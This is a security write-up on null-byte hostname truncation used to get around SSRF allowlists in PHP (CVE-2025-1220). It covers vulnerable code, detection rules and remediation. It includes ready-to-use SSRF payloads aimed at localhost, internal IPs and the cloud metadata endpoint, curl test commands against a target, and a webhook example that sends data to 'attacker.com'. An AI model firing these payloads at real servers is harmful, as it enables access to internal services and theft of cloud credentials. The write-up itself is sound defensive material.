# Null Byte Hostname Truncation (SSRF Bypass)

## Pattern Overview

| Attribute | Value |
|-----------|-------|
| **Pattern Class** | `ssrf/null-byte-hostname` |
| **Severity** | HIGH |
| **Score** | 9/10 |
| **CVSS** | 5.3 (but high chain potential) |
| **CWE** | CWE-918 (Server-Side Request Forgery), CWE-20 (Improper Input Validation) |
| **Languages** | PHP (confirmed), potentially Python, Ruby, other C-based runtimes |
| **Source CVE** | CVE-2025-1220 (PHP) |
| **Status** | Patched in PHP 8.1.33, 8.2.29, 8.3.23, 8.4.10 |

## Description

Null byte injection in hostnames exploits the difference between how URL parsing functions and network functions handle strings. URL parsers (like `parse_url()`) may process the full string including characters after the null byte, while network functions (like `fsockopen()`) pass the hostname to C library functions that treat null bytes as string terminators.

This creates a validation bypass where:
1. Validator sees: `localhost\0.safedomain.com` → extracts host as containing `.safedomain.com`
2. Network function sees: `localhost` (truncated at null byte) → connects to localhost

## Technical Details

### Root Cause

The vulnerability exists because:
1. PHP's `fsockopen()` passes hostnames directly to C library functions
2. C functions like `getaddrinfo()` treat `\0` as end-of-string
3. Higher-level parsers may not recognize null bytes as special

From the PHP advisory:
> "hostname is passed directly to the low-level C function calls at fsock.c, where it can contain null bytes in the middle of the string."

### Vulnerable Code Pattern

```php
// VULNERABLE: parse_url doesn't warn about null bytes
$url = "http://localhost\0.safedomain.com/api/internal";

// Validation passes - parse_url sees the full hostname
$parsed = parse_url($url);
$host = $parsed['host'];  // Returns "localhost\0.safedomain.com" or similar

// Allowlist check passes
if (!str_ends_with($host, ".safedomain.com")) {
    die("Invalid host");
}

// But fsockopen connects to localhost!
$fp = fsockopen($host, 80, $errno, $errstr, 30);
// Connection goes to: localhost:80
```

### Affected Functions

**Vulnerable sinks (truncate at null byte)**:
- `fsockopen()` - Primary affected function
- `pfsockopen()` - Persistent socket variant
- `stream_socket_client()` - May be affected
- Other functions using `php_network_getaddresses()`

**Parsers that may not detect null bytes**:
- `parse_url()` - Returns parsed components with null bytes intact
- Custom validation using string functions

### Attack Scenarios

#### Scenario 1: SSRF to Internal Services

```php
// Application allows fetching URLs from "trusted" domains
$userUrl = $_GET['url'];  // "http://internal-api\0.allowed-domain.com/admin"

$parsed = parse_url($userUrl);
if ($parsed['host'] !== 'allowed-domain.com' &&
    !str_ends_with($parsed['host'], '.allowed-domain.com')) {
    die("Untrusted domain");
}

// Validation passes, but request goes to internal-api
$response = file_get_contents($userUrl);  // Depends on wrapper implementation
```

#### Scenario 2: Bypassing URL Allowlists

```php
// Webhook URL validation
function isAllowedWebhook($url) {
    $host = parse_url($url, PHP_URL_HOST);
    $allowed = ['hooks.slack.com', 'discord.com', 'api.github.com'];

    foreach ($allowed as $domain) {
        if (str_contains($host, $domain)) {
            return true;  // Passes for "attacker.com\0hooks.slack.com"
        }
    }
    return false;
}

// Attacker sets webhook to: http://attacker.com\0hooks.slack.com/callback
// Validation passes, data exfiltrated to attacker.com
```

#### Scenario 3: DNS Rebinding Amplification

```php
// Combine with DNS rebinding for internal network scanning
$target = "169.254.169.254\0.legitimate-service.com";
// Bypasses hostname checks
// fsockopen connects to AWS metadata service
```

### Exploitation Payload Examples

```
# Basic localhost access
http://localhost\0.allowed.com/admin

# Internal IP access
http://192.168.1.1\0.external.com/

# Cloud metadata
http://169.254.169.254\0.allowed.com/latest/meta-data/

# IPv6 localhost
http://[::1]\0.allowed.com/

# With port
http://localhost:8080\0.allowed.com/admin
```

### URL Encoding Variations

```
# URL encoded null byte
http://localhost%00.allowed.com/

# Double encoding
http://localhost%2500.allowed.com/

# Unicode null
http://localhost\u0000.allowed.com/
```

## Detection

### Semgrep Rule Approach

```yaml
rules:
  - id: php-null-byte-ssrf-fsockopen
    mode: taint
    pattern-sources:
      - pattern: $_GET[...]
      - pattern: $_POST[...]
      - pattern: $_REQUEST[...]
      - pattern: file_get_contents("php://input")
    pattern-sinks:
      - pattern: fsockopen($HOST, ...)
      - pattern: pfsockopen($HOST, ...)
      - pattern: stream_socket_client($HOST, ...)
    pattern-sanitizers:
      - pattern: str_replace("\0", "", $X)
      - pattern: preg_replace('/\x00/', '', $X)
    message: "User input flows to socket function without null byte sanitization"
    languages: [php]
    severity: ERROR

  - id: php-hostname-null-byte-check
    patterns:
      - pattern-either:
          - pattern: fsockopen($HOST, ...)
          - pattern: pfsockopen($HOST, ...)
      - pattern-not-inside: |
          if (strpos($HOST, "\0") !== false) { ... }
      - pattern-not-inside: |
          $HOST = str_replace("\0", "", ...);
    message: "Socket connection without null byte check in hostname"
    languages: [php]
    severity: WARNING
```

### Manual Code Review

Look for:
1. URL parsing followed by network operations
2. Hostname validation without null byte checks
3. String comparison for domain allowlists
4. `fsockopen()` or `pfsockopen()` with user-influenced hostnames

### Log Analysis

Search for:
- Requests with `%00` in URL parameters
- Unusual connections from web servers to internal IPs
- Hostname validation logs showing `.allowed.com` suffix with unexpected prefixes

## Remediation

### Immediate Fix

```php
// Always strip null bytes from hostnames
function sanitizeHostname($hostname) {
    // Remove null bytes
    $clean = str_replace("\0", "", $hostname);

    // Also remove other control characters
    $clean = preg_replace('/[\x00-\x1f\x7f]/', '', $clean);

    return $clean;
}

// Usage
$host = sanitizeHostname(parse_url($url, PHP_URL_HOST));
if ($host === '' || $host === null) {
    die("Invalid hostname");
}
```

### Comprehensive URL Validation

```php
function validateUrl($url, $allowedDomains) {
    // 1. Check for null bytes early
    if (strpos($url, "\0") !== false) {
        return false;
    }

    // 2. Parse URL
    $parsed = parse_url($url);
    if ($parsed === false || !isset($parsed['host'])) {
        return false;
    }

    // 3. Additional filter_var check
    if (filter_var($url, FILTER_VALIDATE_URL) === false) {
        return false;
    }

    // 4. Verify scheme
    if (!in_array($parsed['scheme'] ?? '', ['http', 'https'])) {
        return false;
    }

    // 5. Check against allowlist
    $host = strtolower($parsed['host']);
    foreach ($allowedDomains as $domain) {
        if ($host === $domain || str_ends_with($host, '.' . $domain)) {
            return true;
        }
    }

    return false;
}
```

### Using filter_var as Additional Check

```php
// filter_var rejects URLs with null bytes
$url = "http://localhost\0.allowed.com/";

if (filter_var($url, FILTER_VALIDATE_URL) === false) {
    die("Invalid URL");  // This will trigger
}
```

### PHP Version Upgrade

Upgrade to patched versions:
- PHP 8.1.33+
- PHP 8.2.29+
- PHP 8.3.23+
- PHP 8.4.10+

The fix adds `iscntrl()` checks to reject control characters including null bytes.

## Testing

### Manual Testing

```bash
# Test if application is vulnerable
curl "https://target.com/fetch?url=http://localhost%00.allowed.com/"

# Check for internal access
curl "https://target.com/fetch?url=http://127.0.0.1%00.allowed.com/admin"

# Cloud metadata test
curl "https://target.com/fetch?url=http://169.254.169.254%00.allowed.com/"
```

### Unit Test

```php
public function testNullByteInHostname() {
    $maliciousUrl = "http://localhost\0.allowed.com/";

    // Should reject or sanitize
    $this->assertFalse(validateUrl($maliciousUrl, ['allowed.com']));

    // Sanitized version should be safe
    $sanitized = sanitizeHostname(parse_url($maliciousUrl, PHP_URL_HOST));
    $this->assertEquals('localhost.allowed.com', $sanitized);
}
```

## References

- [PHP Security Advisory GHSA-3cr5-j632-f35r](https://github.com/php/php-src/security/advisories/GHSA-3cr5-j632-f35r)
- [CVE-2025-1220 Details](https://nvd.nist.gov/vuln/detail/CVE-2025-1220)
- [PHP parse_url Documentation](https://www.php.net/manual/en/function.parse-url.php)
- [SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Invicti: PHP SSRF CVE-2025-1220](https://www.invicti.com/web-application-vulnerabilities/php-server-side-request-forgery-ssrf-vulnerability-cve-2025-1220)

## Related Patterns

- `ssrf/parse-url-bypass` - Other parse_url bypass techniques (port :000443)
- `ssrf/dns-rebinding` - DNS-based SSRF bypasses
- `ssrf/redirect-bypass` - Following redirects to internal hosts
- `injection/null-byte-file` - Null byte injection in file paths
